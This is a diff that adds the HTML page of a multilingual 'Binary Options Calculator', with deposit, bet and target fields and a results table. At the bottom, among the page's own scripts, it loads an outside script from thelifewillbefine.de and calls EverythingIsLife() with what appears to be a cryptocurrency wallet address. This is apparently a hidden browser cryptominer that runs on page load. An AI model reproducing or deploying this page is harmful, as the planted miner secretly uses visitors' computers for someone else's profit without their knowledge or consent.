@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binary Options Calculator</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1 data-lang="title">Binary Options Calculator</h1>
+
+        <div class="language-selector">
+            <label for="language">Choose Language:</label>
+            <select id="language" onchange="changeLanguage()">
+                <option value="en">English</option>
+                <option value="ru">Русский</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="tr">Türkçe</option>
+                <option value="vi">Tiếng Việt</option>
+                <option value="th">ภาษาไทย</option>
+            </select>
+        </div>
+
+        <label for="deposit" data-lang="deposit">Enter Your Deposit:</label>
+        <input type="number" id="deposit" placeholder="Enter your deposit amount" step="0.01">
+
+        <label for="initialBet" data-lang="initialBet">Enter Your Initial Bet:</label>
+        <input type="number" id="initialBet" placeholder="Enter your initial bet amount" step="0.01">
+
+        <label for="targetAmount" data-lang="targetAmount">Enter Desired Target Amount:</label>
+        <input type="number" id="targetAmount" placeholder="Enter your target amount" step="0.01">
+
+        <label for="averageWins" data-lang="averageWins">Average Bets Per Day:</label>
+        <input type="number" id="averageWins" placeholder="Enter average bets per day" step="1">
+
+        <button onclick="calculateStakes()" data-lang="calculate">Calculate</button>
+
+        <table id="resultsTable" style="display:none;">
+            <thead>
+                <tr>
+                    <th data-lang="round">Round</th>
+                    <th data-lang="betAmount">Bet Amount</th>
+                    <th data-lang="totalRisk">Total Risk (%)</th>
+                </tr>
+            </thead>
+            <tbody>
+            </tbody>
+        </table>
+
+        <p id="maxRounds" style="display:none; text-align:center; font-weight:bold; margin-top:20px;"></p>
+
+        <p id="targetInfo" style="display:none; text-align:center; font-weight:bold; margin-top:20px;"></p>
+    </div>
+    <script src="translations.js"></script>
+    <script src="script.js"></script>
+    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
+    <script>
+        EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 30);
+    </script>
+</body>
+</html>
